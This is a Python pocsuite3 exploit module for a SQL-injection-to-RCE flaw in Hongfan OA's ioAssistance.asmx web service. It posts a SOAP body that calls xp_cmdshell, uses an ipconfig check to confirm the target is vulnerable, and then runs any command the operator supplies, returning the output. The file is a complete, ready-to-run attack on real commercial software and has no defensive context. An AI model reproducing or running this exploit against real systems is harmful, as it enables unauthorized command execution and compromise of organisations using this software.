from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict,OptString
from pocsuite3.api import get_listener_ip, get_listener_port,REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '红帆OA ioAssistance.asmx 注入RCE'
    appName = '红帆 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''None'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('',require=False)
        return o

    def _verify(self, verify=True):
        result = {}
        headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'text/xml',
        }
        data ='''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetLoginedEmpNoReadedInf
            xmlns="http://tempuri.org/">
            <sql>exec master..xp_cmdshell "ipconfig"</sql>
        </GetLoginedEmpNoReadedInf>
    </soap:Body>
</soap:Envelope>'''
        vul_url = self.url+"/iOffice/prg/set/wss/ioAssistance.asmx"
        resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
        if resp.status_code == 200 and "Windows IP" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url

        return self.parse_output(result)

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'text/xml',
        }
        data ='''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetLoginedEmpNoReadedInf
            xmlns="http://tempuri.org/">
            <sql>exec master..xp_cmdshell "{}"</sql>
        </GetLoginedEmpNoReadedInf>
    </soap:Body>
</soap:Envelope>'''.format(cmd)
        vul_url = self.url+"/iOffice/prg/set/wss/ioAssistance.asmx"
        resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
        if resp.status_code == 200 and "Windows IP" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = resp.text
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
